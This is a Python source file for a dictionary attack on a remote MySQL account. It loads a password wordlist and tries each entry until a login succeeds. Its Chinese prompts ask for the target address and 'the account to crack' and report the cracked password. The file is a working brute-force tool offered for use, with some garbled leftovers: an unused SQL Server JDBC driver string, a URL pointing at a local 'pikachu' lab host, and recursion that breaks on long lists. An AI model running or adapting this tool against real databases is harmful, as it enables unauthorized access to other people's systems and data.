import os
import sys
import time
import random
import io
import requests
import mysql.connector

class CheckSQLPasswordUtli:
    def __init__(self, database_url, db_user, password_path):
        self.DBDRIVER = "com.microsoft.jdbc.sqlserver.SQLServerDriver"
        self.DBURL = "http://192.168.1.192:8086/pikachu/"
        self.database_url = database_url
        self.db_user = db_user
        self.password_path = password_path
        self.passwords = []
        self.is_check = False
        self.true_password = ""

    def init(self):
        if self.database_url is None or self.database_url == "":
            print("[系统提示]: 请输入远程数据地址")
            return False
        if self.db_user is None or self.db_user == "":
            print("[系统提示]: 请输入你要破解的数据库账号")
            return False
        if self.password_path is None or self.password_path == "":
            print("[系统提示]: 请输入字典文件路径")
            return False
        # 数据库连接URL
        db_url = self.DBURL.format(self.database_url)
        print(db_url)
        return True

    def check_pass(self):
        pass_str = ""
        try:
            if len(self.passwords) < 1:
                return False
            pass_str = self.passwords[0]
            self.passwords.remove(pass_str)
            cnx = mysql.connector.connect(user=self.db_user, password=pass_str, host=self.database_url, database="")
            cnx.close()
            self.true_password = pass_str
            self.is_check = True
        except mysql.connector.errors.ProgrammingError as err:
            print("[进度提示]: {u}用户尝试{p}... >>>失败".format(u=self.db_user, p=pass_str))
            self.check_pass()
        return self.is_check

    def get_passwords(self):
        try:
            with io.open(self.password_path, "r", encoding="utf-8") as f:
                for line in f.readlines():
                    self.passwords.append(line.strip())
                self.passwords.append("")
            print("装载完毕，读取密码个数:", len(self.passwords))
        except IOError as e:
            print("读取密码文件出错")

    def do_check(self):
        s_time = int(round(time.time() * 1000))
        # 初始化参数
        self.init()
        # 装载密码
        self.get_passwords()
        if self.check_pass():
            print("密码破解成功>>>", self.true_password)
        else:
            print("破解失败，密码文件中不包含正确密码")
        print("本次破解耗时：", int(round(time.time() * 1000)) - s_time, "ms")